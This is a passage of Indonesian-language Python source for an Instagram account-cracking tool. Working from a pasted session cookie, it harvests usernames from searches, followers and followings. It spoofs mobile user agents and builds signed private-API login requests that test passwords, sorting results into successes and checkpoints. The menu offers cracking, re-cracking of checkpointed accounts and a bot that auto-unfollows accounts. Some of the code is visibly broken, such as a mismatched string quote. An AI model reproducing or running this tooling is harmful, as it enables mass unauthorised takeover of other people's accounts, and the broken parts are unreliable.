""",subtitle=f"Good Night",title=f"{B2}{Definisi__Waktu()}",width=90,padding=(0,4),style=f"bold cyan"))

def loading():
    animation = ["[\x1b[1;91m■\x1b[0m□□□□□□□□□]","[\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[\x1b[1;94m■■■■\x1b[0m□□□□□□]", "[\x1b[1;95m■■■■■\x1b[0m□□□□□]", "[\x1b[1;96m■■■■■■\x1b[0m□□□□]", "[\x1b[1;97m■■■■■■■\x1b[0m□□□]", "[\x1b[1;98m■■■■■■■■\x1b[0m□□]", "[\x1b[1;99m■■■■■■■■■\x1b[0m□]", "[\x1b[1;910m■■■■■■■■■■\x1b[0m]"]
    for i in range(50):
        time.sleep(0.1)
        sys.stdout.write(f"\r{P}[{M}!{P}] convert cookie... " + animation[i % len(animation)] +"\x1b[0m ")
        sys.stdout.flush()
    print("")		

try:
    # python 2
	urllib_quote_plus = urllib.quote
except:
    # python 3
	urllib_quote_plus = urllib.parse.quote_plus

def cekAPI(cookie):
    user=open('data/user.txt','r').read()
    coki = open('data/cookie.txt','r').read()
    try:
        c=s.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(user),cookies={'cookie':coki},headers={"user-agent":USN,"x-ig-app-id":'936619743392459'})
        i=c.json()["data"]["user"]
        nama=i["full_name"]
        followers=i["edge_followed_by"]["count"]
        following=i["edge_follow"]["count"]
        external.append(f'{nama}|{followers}|{following}')
    except FileNotFoundError:
    	os.remove('data/cookie.txt')
    	os.remove('data/user.txt')
    except  (ValueError,KeyError):
        print(f"{P}[{B}+{P}] instagram checkpoint")
        os.remove('data/cookie.txt')
        os.remove('data/user.txt')
        exit()

    return external,user

def ggwp17():
        try:
            kuki=open('data/cookie.txt','r').read()
            logo()
        except FileNotFoundError:
            prints(Panel(f"login menggunakan cookie, disarankan tidak menggunakan akun pribadi anda",width=90,padding=(0,2),style=f"#FFFFFF"))
            coki = input(f"{P}[{B}?{P}] masukan cookie : {H}")
            loading()
            try:
                id = re.search('ds_user_id=(\d+)',str(coki)).group(1)
                po = s.get(f"https://i.instagram.com/api/v1/users/{id}/info/",headers={"user-agent":USN},cookies={"cookie":coki})
                xx = json.loads(po.text)['user']
                useri = xx["username"]
                user = open('data/user.txt','w').write(useri)
                kuki = open('data/cookie.txt','w').write(coki)
                jalan(f'{P}[{H}✓{P}] selamat datang {H}{useri}{P} cookie kamu valid')
                time.sleep(0.05)
                prints(Panel(f"{H2}tolong gunakan script ini dengan bijak ya :)\natas apapun yang terjadi admin tidak bertanggung jawab.",title=f"{M2}• {K2}• {H2}•{P2} INFORMASI {H2}• {K2}• {M2}•",width=90,padding=(0,9),style=f"bold cyan"))
                time.sleep(3)
            except (json.decoder.JSONDecodeError, KeyError, AttributeError):
                jalan(f"{P}[{M}X{P}] cookie invalid silahkan masukan cookie lainnya")
                time.sleep(3)
                RemoveCookie()
                exit()
            except ConnectionAbortedError:
                print(f"{P}[{M}!{P}] koneksi internet anda bermasalah")
                time.sleep(3)
                exit()
        ex,user=cekAPI(kuki)
        cookie={'cookie':kuki}
        instagram(ex,user,cookie).menu()

def User_Agent():
	dpi_phone = [
		'133','320','515','160','640','240','120'
		'800','480','225','768','216','1024']
	model_phone = [
		'Nokia 2.4','HUAWEI','Galaxy',
		'Unlocked Smartphones','Nexus 6P',
		'Mobile Phones','Xiaomi',
		'samsung','OnePlus']
	pxl_phone = [
		'623x1280','700x1245','800x1280',
		'1080x2340','1320x2400','1242x2688']
	i_version = [
		'114.0.0.20.2','114.0.0.38.120',
		'114.0.0.20.70','114.0.0.28.120',
		'114.0.0.0.24','114.0.0.0.41']
	User_Agent = f'Instagram '+random.choice(i_version)+' Android (30/3.0; '+random.choice(dpi_phone)+'dpi; '+random.choice(pxl_phone)+'; huawei/google; '+random.choice(model_phone)+'; angler; angler; en_US)'
	return User_Agent

def user_agent():
	resolutions = ['720x1280', '320x480', '480x800', '1024x768', '1280x720', '768x1024', '480x320']
	versions = ['GT-N7000', 'SM-N9000', 'GT-I9220', 'GT-I9100']
	dpis = ['120', '160', '320', '240']
	ver = random.choice(versions)
	dpi = random.choice(dpis)
	res = random.choice(resolutions)
	return (
		'Instagram 4.{}.{} '
		'Android ({}/{}.{}.{}; {}; {}; samsung; {}; {}; smdkc210; en_US)'
	).format(
		random.randint(1, 2),
		random.randint(0, 2),
		random.randint(10, 11),
		random.randint(1, 3),
		random.randint(3, 5),
		random.randint(0, 5),
		dpi,
		res,
		ver,
		ver,
	)

def user_agentAPI():
	APP_VERSION = "136.0.0.34.124"
	VERSION_CODE = "208061712"
	DEVICES = {
		"one_plus_7": {"app_version": APP_VERSION,"android_version": "29","android_release": "10.0","dpi": "420dpi","resolution": "1080x2340","manufacturer": "OnePlus","device": "GM1903","model": "OnePlus7","cpu": "qcom","version_code": VERSION_CODE},
		"one_plus_3": {"app_version": APP_VERSION,"android_version": "28","android_release": "9.0","dpi": "420dpi","resolution": "1080x1920","manufacturer": "OnePlus","device": "ONEPLUS A3003","model": "OnePlus3","cpu": "qcom","version_code": VERSION_CODE},
		"samsung_galaxy_s7": {"app_version": APP_VERSION,"android_version": "26","android_release": "8.0","dpi": "640dpi","resolution": "1440x2560","manufacturer": "samsung","device": "SM-G930F","model": "herolte","cpu": "samsungexynos8890","version_code": VERSION_CODE},
		"huawei_mate_9_pro": {"app_version": APP_VERSION,"android_version": "24","android_release": "7.0","dpi": "640dpi","resolution": "1440x2560","manufacturer": "HUAWEI","device": "LON-L29","model": "HWLON","cpu": "hi3660","version_code": VERSION_CODE},
		"samsung_galaxy_s9_plus": {"app_version": APP_VERSION,"android_version": "28","android_release": "9.0","dpi": "640dpi","resolution": "1440x2560","manufacturer": "samsung","device": "SM-G965F","model": "star2qltecs","cpu": "samsungexynos9810","version_code": VERSION_CODE},
		"one_plus_3t": {"app_version": APP_VERSION,"android_version": "26","android_release": "8.0","dpi": "380dpi","resolution": "1080x1920","manufacturer": "OnePlus","device": "ONEPLUS A3010","model": "OnePlus3T","cpu": "qcom","version_code": VERSION_CODE},
		"lg_g5": {"app_version": APP_VERSION,"android_version": "23","android_release": "6.0.1","dpi": "640dpi","resolution": "1440x2392","manufacturer": "LGE/lge","device": "RS988","model": "h1","cpu": "h1","version_code": VERSION_CODE},
		"zte_axon_7": {"app_version": APP_VERSION,"android_version": "23","android_release": "6.0.1","dpi": "640dpi","resolution": "1440x2560","manufacturer": "ZTE","device": "ZTE A2017U","model": "ailsa_ii","cpu": "qcom","version_code": VERSION_CODE},
		"samsung_galaxy_s7_edge": {"app_version": APP_VERSION,"android_version": "23","android_release": "6.0.1","dpi": "640dpi","resolution": "1440x2560","manufacturer": "samsung","device": "SM-G935","model": "hero2lte","cpu": "samsungexynos8890","version_code": VERSION_CODE},}
	DEFAULT_DEVICE = random.choice(list(DEVICES.keys()))
	app_version = DEVICES[DEFAULT_DEVICE]['app_version']
	android_version = DEVICES[DEFAULT_DEVICE]['android_version']
	android_release = DEVICES[DEFAULT_DEVICE]['android_release']
	dpi = DEVICES[DEFAULT_DEVICE]['dpi']
	resolution = DEVICES[DEFAULT_DEVICE]['resolution']
	manufacturer = DEVICES[DEFAULT_DEVICE]['manufacturer']
	device = DEVICES[DEFAULT_DEVICE]['device']
	model = DEVICES[DEFAULT_DEVICE]['model']
	cpu = DEVICES[DEFAULT_DEVICE]['cpu']
	version_code = DEVICES[DEFAULT_DEVICE]['version_code']
	USER_AGENT_BASE = f"Instagram {app_version} "+f"Android ({android_version}/{android_release}; "+f"{dpi}; {resolution}; {manufacturer}; "+f"{device}; {model}; {cpu}; en_US; {version_code})"
	return USER_AGENT_BASE

class instagramAPI:
	API_URL = 'https://i.instagram.com/api/v1/'
	DEVICE_SETTINTS = {'manufacturer': 'Xiaomi',
		'model': 'HM 1SW',
		'android_version': 18,
		'android_release': '4.3'}
	USER_AGENT = 'Instagram 10.26.0 Android ({android_version}/{android_release}; 320dpi; 720x1280; {manufacturer}; {model}; armani; qcom; en_US)'.format(**DEVICE_SETTINTS)
	IG_SIG_KEY = '4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178'
	EXPERIMENTS = 'ig_promote_reach_objective_fix_universe,ig_android_universe_video_production,ig_search_client_h1_2017_holdout,ig_android_live_follow_from_comments_universe,ig_android_carousel_non_square_creation,ig_android_live_analytics,ig_android_follow_all_dialog_confirmation_copy,ig_android_stories_server_coverframe,ig_android_video_captions_universe,ig_android_offline_location_feed,ig_android_direct_inbox_retry_seen_state,ig_android_ontact_invite_universe,ig_android_live_broadcast_blacklist,ig_android_insta_video_reconnect_viewers,ig_android_ad_async_ads_universe,ig_android_search_clear_layout_universe,ig_android_shopping_reporting,ig_android_stories_surface_universe,ig_android_verified_comments_universe,ig_android_preload_media_ahead_in_current_reel,android_instagram_prefetch_suggestions_universe,ig_android_reel_viewer_fetch_missing_reels_universe,ig_android_direct_search_share_sheet_universe,ig_android_business_promote_tooltip,ig_android_direct_blue_tab,ig_android_async_network_tweak_universe,ig_android_elevate_main_thread_priority_universe,ig_android_stories_gallery_nux,ig_android_instavideo_remove_nux_comments,ig_video_copyright_whitelist,ig_react_native_inline_insights_with_relay,ig_android_direct_thread_message_animation,ig_android_draw_rainbow_client_universe,ig_android_direct_link_style,ig_android_live_heart_enhancements_universe,ig_android_rtc_reshare,ig_android_preload_item_count_in_reel_viewer_buffer,ig_android_users_bootstrap_service,ig_android_auto_retry_post_mode,ig_android_shopping,ig_android_main_feed_seen_state_dont_send_info_on_tail_load,ig_fbns_preload_default,ig_android_gesture_dismiss_reel_viewer,ig_android_tool_tip,ig_android_ad_logger_funnel_logging_universe,ig_android_gallery_grid_column_count_universe,ig_android_business_new_ads_payment_universe,ig_android_direct_links,ig_android_audience_control,ig_android_live_encore_consumption_settings_universe,ig_perf_android_holdout,ig_android_cache_contact_import_list,ig_android_links_receivers,ig_android_ad_impression_backtest,ig_android_list_redesign,ig_android_stories_separate_overlay_creation,ig_android_stop_video_recording_fix_universe,ig_android_render_video_segmentation,ig_android_live_encore_reel_chaining_universe,ig_android_sync_on_background_enhanced_10_25,ig_android_immersive_viewer,ig_android_mqtt_skywalker,ig_fbns_push,ig_android_ad_watchmore_overlay_universe,ig_android_react_native_universe,ig_android_profile_tabs_redesign_universe,ig_android_live_consumption_abr,ig_android_story_viewer_social_context,ig_android_hide_post_in_feed,ig_android_video_loopcount_int,ig_android_enable_main_feed_reel_tray_preloading,ig_android_camera_upsell_dialog,ig_android_ad_watchbrowse_universe,ig_android_internal_research_settings,ig_android_search_people_tag_universe,ig_android_react_native_ota,ig_android_enable_concurrent_request,ig_android_react_native_stories_grid_view,ig_android_business_stories_inline_insights,ig_android_log_mediacodec_info,ig_android_direct_expiring_media_loading_errors,ig_video_use_sve_universe,ig_android_cold_start_feed_request,ig_android_enable_zero_rating,ig_android_reverse_audio,ig_android_branded_content_three_line_ui_universe,ig_android_live_encore_production_universe,ig_stories_music_sticker,ig_android_stories_teach_gallery_location,ig_android_http_stack_experiment_2017,ig_android_stories_device_tilt,ig_android_pending_request_search_bar,ig_android_fb_topsearch_sgp_fork_request,ig_android_seen_state_with_view_info,ig_android_animation_perf_reporter_timeout,ig_android_new_block_flow,ig_android_story_tray_title_play_all_v2,ig_android_direct_address_links,ig_android_stories_archive_universe,ig_android_save_collections_cover_photo,ig_android_live_webrtc_livewith_production,ig_android_sign_video_url,ig_android_stories_video_prefetch_kb,ig_android_stories_create_flow_favorites_tooltip,ig_android_live_stop_broadcast_on_404,ig_android_live_viewer_invite_universe,ig_android_promotion_feedback_channel,ig_android_render_iframe_interval,ig_android_accessibility_logging_universe,ig_android_camera_shortcut_universe,ig_android_use_one_cookie_store_per_user_override,ig_profile_holdout_2017_universe,ig_android_stories_server_brushes,ig_android_ad_media_url_logging_universe,ig_android_shopping_tag_nux_text_universe,ig_android_comments_single_reply_universe,ig_android_stories_video_loading_spinner_improvements,ig_android_collections_cache,ig_android_comment_api_spam_universe,ig_android_facebook_twitter_profile_photos,ig_android_shopping_tag_creation_universe,ig_story_camera_reverse_video_experiment,ig_android_direct_bump_selected_recipients,ig_android_ad_cta_haptic_feedback_universe,ig_android_vertical_share_sheet_experiment,ig_android_family_bridge_share,ig_android_search,ig_android_insta_video_consumption_titles,ig_android_stories_gallery_preview_button,ig_android_fb_auth_education,ig_android_camera_universe,ig_android_me_only_universe,ig_android_instavideo_audio_only_mode,ig_android_user_profile_chaining_icon,ig_android_live_video_reactions_consumption_universe,ig_android_stories_hashtag_text,ig_android_post_live_badge_universe,ig_android_swipe_fragment_container,ig_android_search_users_universe,ig_android_live_save_to_camera_roll_universe,ig_creation_growth_holdout,ig_android_sticker_region_tracking,ig_android_unified_inbox,ig_android_live_new_watch_time,ig_android_offline_main_feed_10_11,ig_import_biz_contact_to_page,ig_android_live_encore_consumption_universe,ig_android_experimental_filters,ig_android_search_client_matching_2,ig_android_react_native_inline_insights_v2,ig_android_business_conversion_value_prop_v2,ig_android_redirect_to_low_latency_universe,ig_android_ad_show_new_awr_universe,ig_family_bridges_holdout_universe,ig_android_background_explore_fetch,ig_android_following_follower_social_context,ig_android_video_keep_screen_on,ig_android_ad_leadgen_relay_modern,ig_android_profile_photo_as_media,ig_android_insta_video_consumption_infra,ig_android_ad_watchlead_universe,ig_android_direct_prefetch_direct_story_json,ig_android_shopping_react_native,ig_android_top_live_profile_pics_universe,ig_android_direct_phone_number_links,ig_android_stories_weblink_creation,ig_android_direct_search_new_thread_universe,ig_android_histogram_reporter,ig_android_direct_on_profile_universe,ig_android_network_cancellation,ig_android_background_reel_fetch,ig_android_react_native_insights,ig_android_insta_video_audio_encoder,ig_android_family_bridge_bookmarks,ig_android_data_usage_network_layer,ig_android_universal_instagram_deep_links,ig_android_dash_for_vod_universe,ig_android_modular_tab_discover_people_redesign,ig_android_mas_sticker_upsell_dialog_universe,ig_android_ad_add_per_event_counter_to_logging_event,ig_android_sticky_header_top_chrome_optimization,ig_android_rtl,ig_android_biz_conversion_page_pre_select,ig_android_promote_from_profile_button,ig_android_live_broadcaster_invite_universe,ig_android_share_spinner,ig_android_text_action,ig_android_own_reel_title_universe,ig_promotions_unit_in_insights_landing_page,ig_android_business_settings_header_univ,ig_android_save_longpress_tooltip,ig_android_constrain_image_size_universe,ig_android_business_new_graphql_endpoint_universe,ig_ranking_following,ig_android_stories_profile_camera_entry_point,ig_android_universe_reel_video_production,ig_android_power_metrics,ig_android_sfplt,ig_android_offline_hashtag_feed,ig_android_live_skin_smooth,ig_android_direct_inbox_search,ig_android_stories_posting_offline_ui,ig_android_sidecar_video_upload_universe,ig_android_promotion_manager_entry_point_universe,ig_android_direct_reply_audience_upgrade,ig_android_swipe_navigation_x_angle_universe,ig_android_offline_mode_holdout,ig_android_live_send_user_location,ig_android_direct_fetch_before_push_notif,ig_android_non_square_first,ig_android_insta_video_drawing,ig_android_swipeablefilters_universe,ig_android_live_notification_control_universe,ig_android_analytics_logger_running_background_universe,ig_android_save_all,ig_android_reel_viewer_data_buffer_size,ig_direct_quality_holdout_universe,ig_android_family_bridge_discover,ig_android_react_native_restart_after_error_universe,ig_android_startup_manager,ig_story_tray_peek_content_universe,ig_android_profile,ig_android_high_res_upload_2,ig_android_http_service_same_thread,ig_android_scroll_to_dismiss_keyboard,ig_android_remove_followers_universe,ig_android_skip_video_render,ig_android_story_timestamps,ig_android_live_viewer_comment_prompt_universe,ig_profile_holdout_universe,ig_android_react_native_insights_grid_view,ig_stories_selfie_sticker,ig_android_stories_reply_composer_redesign,ig_android_streamline_page_creation,ig_explore_netego,ig_android_ig4b_connect_fb_button_universe,ig_android_feed_util_rect_optimization,ig_android_rendering_controls,ig_android_os_version_blocking,ig_android_encoder_width_safe_multiple_16,ig_search_new_bootstrap_holdout_universe,ig_android_snippets_profile_nux,ig_android_e2e_optimization_universe,ig_android_comments_logging_universe,ig_shopping_insights,ig_android_save_collections,ig_android_live_see_fewer_videos_like_this_universe,ig_android_show_new_contact_import_dialog,ig_android_live_view_profile_from_comments_universe,ig_fbns_blocked,ig_formats_and_feedbacks_holdout_universe,ig_android_reduce_view_pager_buffer,ig_android_instavideo_periodic_notif,ig_search_user_auto_complete_cache_sync_ttl,ig_android_marauder_update_frequency,ig_android_suggest_password_reset_on_oneclick_login,ig_android_promotion_entry_from_ads_manager_universe,ig_android_live_special_codec_size_list,ig_android_enable_share_to_messenger,ig_android_background_main_feed_fetch,ig_android_live_video_reactions_creation_universe,ig_android_channels_home,ig_android_sidecar_gallery_universe,ig_android_upload_reliability_universe,ig_migrate_mediav2_universe,ig_android_insta_video_broadcaster_infra_perf,ig_android_business_conversion_social_context,android_ig_fbns_kill_switch,ig_android_live_webrtc_livewith_consumption,ig_android_destroy_swipe_fragment,ig_android_react_native_universe_kill_switch,ig_android_stories_book_universe,ig_android_all_videoplayback_persisting_sound,ig_android_draw_eraser_universe,ig_direct_search_new_bootstrap_holdout_universe,ig_android_cache_layer_bytes_threshold,ig_android_search_hash_tag_and_username_universe,ig_android_business_promotion,ig_android_direct_search_recipients_controller_universe,ig_android_ad_show_full_name_universe,ig_android_anrwatchdog,ig_android_qp_kill_switch,ig_android_2fac,ig_direct_bypass_group_size_limit_universe,ig_android_promote_simplified_flow,ig_android_share_to_whatsapp,ig_android_hide_bottom_nav_bar_on_discover_people,ig_fbns_dump_ids,ig_android_hands_free_before_reverse,ig_android_skywalker_live_event_start_end,ig_android_live_join_comment_ui_change,ig_android_direct_search_story_recipients_universe,ig_android_direct_full_size_gallery_upload,ig_android_ad_browser_gesture_control,ig_channel_server_experiments,ig_android_video_cover_frame_from_original_as_fallback,ig_android_ad_watchinstall_universe,ig_android_ad_viewability_logging_universe,ig_android_new_optic,ig_android_direct_visual_replies,ig_android_stories_search_reel_mentions_universe,ig_android_threaded_comments_universe,ig_android_mark_reel_seen_on_Swipe_forward,ig_internal_ui_for_lazy_loaded_modules_experiment,ig_fbns_shared,ig_android_capture_slowmo_mode,ig_android_live_viewers_list_search_bar,ig_android_video_single_surface,ig_android_offline_reel_feed,ig_android_video_download_logging,ig_android_last_edits,ig_android_exoplayer_4142,ig_android_post_live_viewer_count_privacy_universe,ig_android_activity_feed_click_state,ig_android_snippets_haptic_feedback,ig_android_gl_drawing_marks_after_undo_backing,ig_android_mark_seen_state_on_viewed_impression,ig_android_live_backgrounded_reminder_universe,ig_android_live_hide_viewer_nux_universe,ig_android_live_monotonic_pts,ig_android_search_top_search_surface_universe,ig_android_user_detail_endpoint,ig_android_location_media_count_exp_ig,ig_android_comment_tweaks_universe,ig_android_ad_watchmore_entry_point_universe,ig_android_top_live_notification_universe,ig_android_add_to_last_post,ig_save_insights,ig_android_live_enhanced_end_screen_universe,ig_android_ad_add_counter_to_logging_event,ig_android_blue_token_conversion_universe,ig_android_exoplayer_settings,ig_android_progressive_jpeg,ig_android_offline_story_stickers,ig_android_gqls_typing_indicator,ig_android_chaining_button_tooltip,ig_android_video_prefetch_for_connectivity_type,ig_android_use_exo_cache_for_progressive,ig_android_samsung_app_badging,ig_android_ad_holdout_watchandmore_universe,ig_android_offline_commenting,ig_direct_stories_recipient_picker_button,ig_insights_feedback_channel_universe,ig_android_insta_video_abr_resize,ig_android_insta_video_sound_always_on'''
	SIG_KEY_VERSION = '4'

	def __init__(self,username,password):
		self.username=username
		self.password=password
		m = hashlib.md5()
		m.update(username.encode('utf-8') + password.encode('utf-8'))
		self.device_id = self.generateDeviceId(m.hexdigest())
		self.uuid = self.generateUUID(True)
		self.s = requests.Session()

	def generateDeviceId(self, seed):
		volatile_seed = "12345"
		m = hashlib.md5()
		m.update(seed.encode('utf-8') + volatile_seed.encode('utf-8'))
		return 'android-' + m.hexdigest()[:16]

	def generateUUID(self, type):
		generated_uuid = str(uuid.uuid4())
		if (type):
			return generated_uuid
		else:
			return generated_uuid.replace('-', '')

	def loginAPI(self):
		token=self.s.get("https://www.instagram.com/",headers={"user-agent":User_Agent()}).text
		crf_token=re.findall(r"\"csrf_token\"\:\"(.*?)\"", str(token))[0]
		self.s.headers.update({'Connection': 'close',
			'Accept': '*/*',
			'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
			'Cookie2': '$Version=1',
			'Accept-Language': 'en-US',
			'User-Agent': user_agentAPI()})
		self.data = json.dumps({
			'phone_id': self.generateUUID(True),
			'_csrftoken': crf_token,
			'username': self.username,
			'guid': self.uuid,
			'device_id': self.device_id,
			'password': self.password,
			'login_attempt_count': '0'})
		self.payload = 'signed_body={}.{}&ig_sig_key_version=4'.format(
			self.generateUUID(False),
			urllib.request.quote(self.data)
		)
		x=self.s.post("https://i.instagram.com/api/v1/accounts/login/", self.payload)
		x_jason=json.loads(x.text)
		x_kukis=x.cookies.get_dict()
		if "logged_in_user" in x.text:
			kuki=";".join([v+"="+x_kukis[v] for v in x_kukis])
			#id=x_jason['logged_in_user']['pk']
			#nm=x_jason['logged_in_user']['full_name']
			#pn=x_jason['logged_in_user']['phone_number']
			return {'status':'success','cookie':kuki,'userame':self.username}
		elif 'challenge_required' in x.text:
			return {'status':'checkpoint'}
		else:
			return {'status':'login_error'}
C = ''

class instagram:
	def __init__(self,external,username,cookie):
		self.ext=external
		self.username=username
		self.cookie=cookie
		self.s=requests.Session()
		self.tol = Console()
	def logo(self):
		for i in external:
			try:
				nama=i.split('|')[0]
				followers=i.split('|')[1]
				following=i.split('|')[2]
			except:
				pass
			os.system('clear')
			logo()
			self.mentod()
			prints(Panel(f"{H2}{IP}",title=f"{P2}IP",subtitle=f"{P2}{CN}",width=90,padding=(0,30),style=f"bold cyan"))
			prints(Panel(f"""
{P2}[{R2}01{P2}]. crack id dari pencarian nama   {P2}[{R2}05{P2}]. cek hasil crack
{P2}[{R2}02{P2}]. crack id dari pengikut         {P2}[{R2}06{P2}]. bot auto unfollow
{P2}[{R2}03{P2}]. crack id dari mengikuti        {P2}[{R2}07{P2}]. remove lisensi
{P2}[{R2}04{P2}]. crack ulang hasil cp           {P2}[{R2}00{P2}]. keluar ({M2} hapus cookie {P2})""",title=f"{M2}• {K2}• {H2}•{P2} MENU {H2}• {K2}• {M2}•",width=90,padding=(0,4),style=f"bold cyan"))

	def mentod(self):
	       	for i in external:
	       		nama=i.split('|')[0]
	       		followers=i.split('|')[1]
	       		following=i.split('|')[2]
	       	try:
	       	       ses=requests.Session()
	       	       lisen=open('data/lisensi.txt','r').read()
	       	       met = ses.get('https://app.cryptolens.io/api/key/Activate?token=WyIzMjA4OTAxMyIsInRqSVB5U1dJQkFVdU1yMmFGVGk5eW5ZbnpuOWlmS3FHVjVMdG1Yb1EiXQ==&ProductId=17890&Key='+lisen).json()
	       	       men = met['licenseKey']
	       	       key = men['key'][0:11]
	       	       tahun = men['expires'][0:4]
	       	       buln = men['expires'][5:7]
	       	       tanggal = men['expires'][8:10]
	       	       bulan=bulan_ttl[buln]
	       	       tahun1 = men['created'][0:4]
	       	       buln1 = men['created'][5:7]
	       	       tanggal1 = men['created'][8:10]
	       	       bulan1=bulan_ttl[buln1]
	       	except:
	       	       key = "-"
	       	       tanggal = "-"
	       	       bulan = "-"
	       	       tahun = "-"
	       	       tanggal1 = "-"
	       	       bulan1 = "-"
	       	       tahun1 = "-"
	       	pornhub = []
	        pornhub.append(Panel(f"{P2}nama      : {H2}{nama}\n{P2}username  : {H2}{self.username}\n{P2}pengikut  : {H2}{followers}\n{P2}mengikuti : {H2}{following}",title=f"{M2}• {K2}• {H2}•{P2} DATA AKUN {H2}• {K2}• {M2}•",width=43,padding=(0,2),style=f"bold cyan"))
	        pornhub.append(Panel(f"{P2}lisensi : {H2}{key}716-827-726\n{P2}Tanggal : {H2}Senin tanggal kemis\n{P2}expired : {H2}Hari Kiamat\n{P2}premium : {H2}Ya",title=f"{M2}• {K2}• {H2}•{P2}• {H2}• {K2}• {M2}•",width=43,padding=(0,2),style=f"bold cyan"))
	        self.tol.print(Columns(pornhub))

	def HapusLisen(self):
	    try:
	        xc = input(f"{P}[{B}?{P}] apakah anda yakin ingin menghapus lisensi? : {H}")
	        if xc in ["y","Y"]:
	           os.remove("data/lisensi.txt")
	           jalan(f"{P}[{H}✓{P}] berhasil menghapus lisensi")
	           exit()
	        elif xc in ["t","T"]:
	            jalan(f"{P}[{B}+{P}] kembali ke menu utama")
	            time.sleep(2)
	            self.menu()
	        else:
	            self.Exit()
	    except:pass
	
	def Exit(self):
		try:
		    prints(Panel(f"{R2}{open('data/cookie.txt','r').read()}",title=f"{M2}• {K2}• {H2}•{P2} COOKIE ANDA {H2}• {K2}• {M2}•",padding=(0,2),style=f"bc"))
		    xd = input(f'{P}[{B}?{P}] apakah anda yakin ingin keluar? : {H}')
		    if xd in ["y","Y"]:
		       RemoveCookie()
		       jalan(f"{P}[{H}✓{P}] berhasil menghapus cookie")
		       exit()
		    elif xd in ["t","T"]:
		        jalan(f"{P}[{B}+{P}] kembali ke menu utama")
		        time.sleep(2)
		        self.menu()
		    else:
		         self.Exit()
		except:pass

	def sixAPI(self,six_id):
		url = "https://www.instagram.com/web/search/topsearch/?context=blended&query="+six_id+"&rank_token=0.3953592318270893&count=1"
		x = requests.get(url)
		x_jason = x.json()
		uid = str( x_jason['users'][0].get("user").get("pk") )
		return uid

	def unfollowAPI(self,user_id,username_id,cookie):
		uuid=generateUUID(True)
		xx=self.s.get("https://www.instagram.com/",headers={"user-agent":USN}).content
		crf_token = re.findall('{"config":{"csrf_token":"(.*)","viewer"',str(xx))[0]
		s.headers.update({'Connection': 'close',
                       'Accept': '*/*',
                       'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                       'Cookie2': '$Version=1',
                       'Accept-Language': 'en-US',
                       'User-Agent': USN})

		data = json.dumps({'_uuid': uuid,
                           '_uid': username_id,
                           'user_id': user_id,
                           '_csrftoken': crf_token})

		self.payload = 'signed_body={}.{}&ig_sig_key_version=4'.format(
			self.generateUUID(False),
			urllib.request.quote(data))
		return s.post('https://i.instagram.com/api/v1/friendships/destroy/%s/'%(user_id),self.payload,cookies=cookie).text


	def searchAPI(self,cookie,nama):
		try:
			for ba in range(100):
				x=s.get('https://www.instagram.com/web/search/topsearch/?count=100000&context=blended&query=%s&rank_token=0.21663777590422106&include_reel=true'%(nama),cookies=cookie,headers={"user-agent":USN})
				x_jason=json.loads(x.text)
				try:
					for i in x_jason['users']:
						user=i['user']
						username=user['username']
						fullname=user['full_name']
						internal.append(f'{username}|{fullname}')
					wr = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
					sys.stdout.write(f"\r{P}[{B}*{P}] sedang mengumpulkan {wr}{len(internal)} {P}id...")
					sys.stdout.flush()
					time.sleep(0.0002)
				except:
					if 'challenge' in x.text:
						break
					else:
						continue
			print("\r")
		except Exception as e:print(e)
		return internal
	
	def ua_ig(self):
	    rr = random.randint
	    return (f"Mozilla/5.0 (Linux; Android {str(rr(7,12))}.{str(rr(7,12))}; Redmi Note {str(rr(7,12))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(80,105))}.0.{str(rr(1111,4444))}.{str(rr(111,400))} Mobile Safari/537.36 Instagram 84.0.0.21.105 Android (24/7.0; 380dpi; 1080x1920; OnePlus; ONEPLUS A3010; OnePlus3T; qcom; en_US; 145652094)")
	
	def idAPI(self,cookie,id):
		if 'sukses' in lisensiku:
			try:
				m=s.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(id),cookies=cookie,headers={"user-agent":USN,"x-ig-app-id":'936619743392459'})
				m_jason=m.json()["data"]["user"]
				idx=m_jason["id"]
			except requests.exceptions.ConnectionError:
				print(f'{P}[{M}!{P}] koneksi internet anda bermasalah');exit()
			except requests.exceptions.ConnectionError:
			    print(f'{P}[{M}!{P}] koneksi internet anda bermasalah')
			    time.sleep(0.3)
			    exit()
			except Exception as e:
				print(f'{P}[{M}!{P}] username tidak tersedia')
				exit()
			return idx
		else:lisensi()
    	
	def infoAPI(self,cookie,api,id):
		if 'sukses' in  lisensiku:
			try:
				x=s.get(api%(id),cookies=cookie,headers={"user-agent":USN})
				x_jason=json.loads(x.text)
				for i in x_jason['users']:
					username = i["username"]
					nama = i["full_name"]
					internal.append(f'{username}|{nama}')
					following.append(username)
				if 'pengikut' in menudump:
					maxid=x_jason['next_max_id']
					for z in range (9999):
						x=s.get('https://i.instagram.com/api/v1/friendships/'+id+'/followers/?count=200&max_id='+maxid,cookies=cookie,headers={"user-agent":USN})
						x_jason=json.loads(x.text)
						try:
							for i in x_jason['users']:
								username = i["username"]
								nama = i["full_name"]
								internal.append(f'{username}|{nama}')
								following.append(username)
							wr = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
							sys.stdout.write(f"\r{P}[{B}*{P}] sedang mengumpulkan {wr}{len(internal)} {P}id...{P}")
							sys.stdout.flush()
							time.sleep(0.0002)
							try:
								maxid=x_jason['next_max_id']
							except:
								break
						except:
							if 'challenge' in x.text:
								break
							else:
								continue
				print("\r")
			except Exception as e:
				print(f'{P}[{M}!{P}] username tidak tersedia')
			return internal
		else:lisensi()
		
	def ifoAPI(self,cookie,api,id):
		if 'sukses' in  lisensiku:
			try:
				x=s.get(api%(id),cookies=cookie,headers={"user-agent":USN})
				x_jason=json.loads(x.text)
				for i in x_jason['users']:
					username = i["username"]
					nama = i["full_name"]
					internal.append(f'{username}|{nama}')
					following.append(username)
				if 'mengikuti' in menudump:
					maxid=x_jason['next_max_id']
					for z in range (9999):
